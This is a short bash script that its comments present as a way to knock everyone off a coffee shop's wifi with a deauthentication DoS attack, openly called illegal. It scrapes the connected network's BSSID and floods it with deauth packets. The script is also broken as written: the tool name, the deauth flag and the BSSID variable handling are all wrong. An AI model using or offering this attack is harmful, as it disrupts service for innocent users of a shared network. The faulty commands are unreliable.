#!/usr/bin/env bash

##############################################################################
# coffee-table
# -----------
# Isn't it annoying when you can't get a seat at a coffee shop?
# Of course it is. DOS the wifi with airplay-ng and clear the place out.
# Now, pull up a chair and enjoy :)
# Definitely illegal! Use at your own risk.
#
# Requires nm-tool, airplay-ng, and a wireless card that supports packet injection
# and monitoring.
#
# Credit to Isis Lovecruft's blog for the DOS attack at the heart of this script:
#
# https://blog.patternsinthevoid.net/broadcast-de-auth-dos-attack-jamming-wifi-networks.html
# 
# :author: greyspectrum
# :date: October 30 2016
# :version: 0.1.0
##############################################################################

nm-tool | grep \* > output1.txt

sed -e '1d' output1.txt > output2.txt
sed 's/............................//' output2.txt > output3.txt
sed -r 's/.{42}$//' output3.txt > BSSID.txt
rm output1.txt output2.txt output3.txt

BSSID="BSSID.txt"

airplay-ng --death 0 -a [$BSSID] mon0
